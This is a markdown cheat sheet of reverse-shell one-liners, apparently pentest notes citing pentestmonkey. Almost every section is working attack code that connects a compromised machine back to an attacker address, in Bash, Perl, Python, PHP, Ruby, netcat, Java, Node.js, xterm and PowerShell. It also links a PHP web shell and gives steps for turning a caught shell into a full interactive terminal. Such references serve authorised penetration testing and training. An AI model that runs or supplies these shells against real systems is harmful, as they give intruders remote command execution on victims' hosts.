### Find out which programs are installed
---
```
for item in $(echo "nmap nc perl python ruby gcc wget sudo curl"); do which $item; done`
```
<br>

### Bash
---
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Perl
---
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python
---
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
---
My favorite web shell: [p0wny-shell](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php)
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
For those situations when a PHP command injection shell spawns and immediately dies, this will run in the background:
```
function execInBackground($cmd) { if (substr(php_uname(), 0, 7) == "Windows"){ pclose(popen("start /B ". $cmd, "r"));  } else { exec($cmd . " > /dev/null &"); } } execInBackground("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.221/8081 0>&1'");
```

### Ruby
---
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat
---
```
nc -e /bin/sh 10.0.0.1 1234
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Java
---
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### JavaScript
---
```
var spawn = require('child_process').spawn;
var net = require('net');
var reconnect = require('reconnect');

reconnect(function (stream) {
    var ps = spawn('bash', [ '-i' ]);
    stream.pipe(ps.stdin);
    ps.stdout.pipe(stream, { end: false });
    ps.stderr.pipe(stream, { end: false });
    ps.on('exit', function () { stream.end() });
}).connect(5500, '192.168.60.124');
```
```
require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
```

### xterm
---
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
```
xterm -display 10.0.0.1:1
```
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
```
Xnest :1
```
You’ll need to authorize the target to connect to you (command also run on your host):
```
xhost +targetip
```

### Powershell Reverse Shell (Inside Powershell.exe)
---
```
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Powershell Reverse Shell (Inside cmd)
---
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
### Upgrading Shells
---
1. `python -c 'import pty; pty.spawn("/bin/bash")'`
2. Background shell with `Ctrl+Z`
3. `echo $TERM && tput lines && tput cols` - (note this, it will disappear)
4. `stty raw -echo`
5. `fg`
6. `reset`
7. `export SHELL=bash`
8. `export TERM=xterm-256color` - (refer to step 3)
9. `stty rows 38 columns 116` - (refer to step 3)

<br>
<br>

**Sources:**

- [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/) 
- [NaviSec Delta](https://delta.navisec.io/reverse-shell-reference/#upgrading-shells)